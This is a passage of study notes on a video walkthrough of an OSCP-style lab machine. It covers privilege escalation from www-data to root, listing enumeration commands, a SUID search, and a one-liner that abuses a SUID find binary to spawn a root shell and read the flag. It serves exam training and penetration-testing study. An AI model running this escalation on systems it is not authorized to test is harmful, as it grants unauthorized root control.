## 3. Privilege Escalation

The goal is to move from the low-privilege `www-data` user to `root`.

### A. Local Enumeration for Privilege Escalation

Key commands to gather information that could lead to privilege escalation:

| Command | Purpose | Key Finding | Timestamp |
| :--- | :--- | :--- | :--- |
| `uname -a` | Displays the system kernel version. | Used to determine if the system is vulnerable to a public kernel exploit. | [[01:09:16](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=4156)] |
| `netstat -tunelp \| grep -i 127.0.0.1` | Checks for network services listening only on the **localhost** (127.0.0.1). | Finds services like MySQL and SMTP that might be exploitable locally. | [[02:20:01](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=8401)] |
| `find / -perm -4000 -type f 2>/dev/null` | **Crucial OSCP Command:** Searches the entire filesystem for files with the **SUID (Set User ID)** bit set. | This reveals potential binaries that run with root privileges, regardless of the calling user. The binary **/usr/bin/find** is identified as SUID. | [[02:51:50](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=10310)] |

### B. Exploiting SUID `find`

The SUID permission on the `find` binary is abused to execute a privileged shell. This technique is often referenced on sites like **GTFOBins** [[02:53:57](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=10437)].

| Command | Purpose | Notes / Key Takeaways | Timestamp |
| :--- | :--- | :--- | :--- |
| `/usr/bin/find . -exec /bin/bash -p \; -quit` | Executes the SUID `find` binary, which runs as root, and then uses the `-exec` flag to execute a privileged bash shell (`/bin/bash -p`). | **The `-p` flag is critical** because it tells the shell to run with **effective privileges** (root, in this case), not just real privileges. | [[03:08:16](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=11296)] |
| `id` | Confirms the current user ID and effective user ID. | The output `uid=0(root)` and `euid=0(root)` confirms a successful root shell. | [[03:10:05](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=11405)] |
| `cat /root/final_flag.txt` | Retrieves the proof-of-concept file (flag) required for the exam report. | This completes the machine and is required for submission. | [[03:22:24](http://www.youtube.com/watch?v=PzPTXDIbw6c&t=12144)] |
